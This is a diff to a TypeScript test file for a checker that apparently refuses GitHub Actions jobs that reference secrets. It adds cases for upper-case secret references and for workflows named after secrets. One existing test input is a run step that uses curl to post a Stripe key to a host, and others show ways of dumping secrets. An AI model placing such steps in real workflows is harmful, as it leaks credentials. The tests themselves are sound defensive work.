@@ -48,6 +48,7 @@ describe('C1: compat copies', () => {
       ['secret in run', GOOD.replace('run: make', `run: curl -d "${S('STRIPE_KEY')}" x`), /secret/],
       ['secret in a comment', `${GOOD}# ${SEC}.X\n`, /secret/],
       ['secret bracket', GOOD.replace('run: make', `run: echo "\${{ ${SEC}['X'] }}"`), /secret/],
+      ['upper-case secrets', GOOD.replace('run: make', `run: echo "\${{ ${SEC.toUpperCase()}.X }}"`), /secret/],
       ['toJSON secrets', GOOD.replace('run: make', `run: echo "\${{ toJSON(${SEC}) }}"`), /secret/],
       ['environment', GOOD.replace('    runs-on', '    environment: prod\n    runs-on'), /environment/],
       ['self-hosted', GOOD.replace('ubuntu-latest', 'self-hosted'), /runs-on/],
@@ -64,6 +65,13 @@ describe('C1: compat copies', () => {
   it('C1: compatCopiesFrom never emits a copy its own check refuses (a job whose text names a secret is not compared)', () => {
     const r = compatCopiesFrom([{ path: '.github/workflows/ci.yml', content: `on: pull_request\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{ run: "cat ${SEC}.txt" }]\n  b:\n    runs-on: ubuntu-latest\n    steps: [{ run: make }]\n` }]);
     for (const f of r.files) expect(C(f.content), f.path).toBe('');
-    expect(r.notCompared.find((n) => n.job === 'a')?.why).toMatch(/secret/);
+    expect(r.notCompared.find((n) => n.job === 'a')?.why).toMatch(/uses a secret/);
+    // the other job is still compared
+    expect(r.files).toHaveLength(1);
+    expect(r.files[0]!.content).toContain('make');
+    // a copy whose own text would break the rules (here its header names the workflow file secrets.yml): not compared, never a stop
+    const named = compatCopiesFrom([{ path: `.github/workflows/${SEC}.yml`, content: 'on: pull_request\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps: [{ run: make }]\n' }]);
+    expect(named.files).toEqual([]);
+    expect(named.notCompared).toEqual([{ workflow: `.github/workflows/${SEC}.yml`, job: 'b', why: expect.stringMatching(/compat rules/) }]);
   });
 });
